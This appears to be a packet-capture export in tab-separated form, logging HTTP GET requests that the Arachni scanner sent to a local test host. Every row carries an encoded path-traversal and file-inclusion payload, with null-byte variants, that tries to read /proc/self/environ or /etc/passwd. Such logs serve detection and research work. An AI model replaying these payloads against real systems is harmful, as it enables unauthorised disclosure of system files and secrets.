http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=file%3A%2F%2F%2F..%2F..%2F%2Fproc%2Fself%2Fenviron%00.		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=file%3A%2F%2F%2F..%2F..%2F%2Fproc%2Fself%2Fenviron%00.
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=file%3A%2F%2F%2F..%2F..%2F%2Fproc%2Fself%2Fenviron		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=file%3A%2F%2F%2F..%2F..%2F%2Fproc%2Fself%2Fenviron
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron%00.		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron%00.
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron%00.		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron%00.
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron%00.		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron%00.
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron%00.		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron%00.
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron%00.		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron%00.
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									23						1	http://192.168.1.102/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron%00.		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron%00.
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									36						1	http://192.168.1.102/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									22						1	http://192.168.1.102/web/?s=%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron%00.		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron%00.
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									64						1	http://192.168.1.102/web/?s=%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									66						1	http://192.168.1.102/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron%00.		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron%00.
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									65						1	http://192.168.1.102/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									67						1	http://192.168.1.102/web/?s=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron%00.		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron%00.
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									53						1	http://192.168.1.102/web/?s=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									62						1	http://192.168.1.102/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron%00.		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron%00.
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									63						1	http://192.168.1.102/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									68						1	http://192.168.1.102/web/?s=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron%00.		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron%00.
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									69						1	http://192.168.1.102/web/?s=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									70						1	http://192.168.1.102/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron%00.		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron%00.
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									141						1	http://192.168.1.102/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									115						1	http://192.168.1.102/web/?s=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron%00.		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron%00.
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									138						1	http://192.168.1.102/web/?s=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									139						1	http://192.168.1.102/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron%00.		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron%00.
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									136						1	http://192.168.1.102/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fproc%2Fself%2Fenviron
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									116						1	http://192.168.1.102/web/?s=%2F..%2F%2Fetc%2Fpasswd%00.		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=%2F..%2F%2Fetc%2Fpasswd%00.
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									133						1	http://192.168.1.102/web/?s=%2F..%2F%2Fetc%2Fpasswd		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=%2F..%2F%2Fetc%2Fpasswd
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									137						1	http://192.168.1.102/web/?s=file%3A%2F%2F%2F..%2F%2Fetc%2Fpasswd%00.		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=file%3A%2F%2F%2F..%2F%2Fetc%2Fpasswd%00.
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=file%3A%2F%2F%2F..%2F%2Fetc%2Fpasswd		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=file%3A%2F%2F%2F..%2F%2Fetc%2Fpasswd
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fetc%2Fpasswd		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fetc%2Fpasswd
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=%2F..%2F..%2F%2Fetc%2Fpasswd%00.		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=%2F..%2F..%2F%2Fetc%2Fpasswd%00.
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=%2F..%2F..%2F%2Fetc%2Fpasswd		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=%2F..%2F..%2F%2Fetc%2Fpasswd
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=file%3A%2F%2F%2F..%2F..%2F%2Fetc%2Fpasswd%00.		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=file%3A%2F%2F%2F..%2F..%2F%2Fetc%2Fpasswd%00.
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=file%3A%2F%2F%2F..%2F..%2F%2Fetc%2Fpasswd		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=file%3A%2F%2F%2F..%2F..%2F%2Fetc%2Fpasswd
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=%2F..%2F..%2F..%2F%2Fetc%2Fpasswd%00.		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=%2F..%2F..%2F..%2F%2Fetc%2Fpasswd%00.
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=%2F..%2F..%2F..%2F%2Fetc%2Fpasswd		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=%2F..%2F..%2F..%2F%2Fetc%2Fpasswd
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F%2Fetc%2Fpasswd%00.		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F%2Fetc%2Fpasswd%00.
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F%2Fetc%2Fpasswd		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F%2Fetc%2Fpasswd
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=%2F..%2F..%2F..%2F..%2F%2Fetc%2Fpasswd%00.		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=%2F..%2F..%2F..%2F..%2F%2Fetc%2Fpasswd%00.
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=%2F..%2F..%2F..%2F..%2F%2Fetc%2Fpasswd		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=%2F..%2F..%2F..%2F..%2F%2Fetc%2Fpasswd
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F..%2F%2Fetc%2Fpasswd%00.		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F..%2F%2Fetc%2Fpasswd%00.
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F..%2F%2Fetc%2Fpasswd		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F..%2F%2Fetc%2Fpasswd
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=%2F..%2F..%2F..%2F..%2F..%2F%2Fetc%2Fpasswd%00.		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=%2F..%2F..%2F..%2F..%2F..%2F%2Fetc%2Fpasswd%00.
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=%2F..%2F..%2F..%2F..%2F..%2F%2Fetc%2Fpasswd		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=%2F..%2F..%2F..%2F..%2F..%2F%2Fetc%2Fpasswd
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F..%2F..%2F%2Fetc%2Fpasswd%00.		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F..%2F..%2F%2Fetc%2Fpasswd%00.
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F..%2F..%2F%2Fetc%2Fpasswd		GET				HTTP/1.1																			Arachni/v1.5.1				/web/?s=file%3A%2F%2F%2F..%2F..%2F..%2F..%2F..%2F%2Fetc%2Fpasswd
